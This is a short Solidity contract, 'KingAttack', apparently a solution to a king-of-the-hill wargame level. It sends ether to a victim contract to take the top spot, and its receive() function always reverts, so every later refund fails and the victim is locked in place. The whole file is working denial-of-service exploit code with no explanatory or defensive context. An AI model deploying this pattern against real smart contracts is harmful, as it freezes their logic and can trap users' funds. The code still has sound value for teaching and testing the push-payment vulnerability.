// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {

    address public victim;
    uint256 public amount;

    constructor(address _victim) payable {
        victim = _victim;
        amount = msg.value;
    }

    receive() external payable {
        revert();
    }

    function attack() external {
        (bool sent, ) = victim.call{value: amount}("");
        if(!sent) revert();
    }
}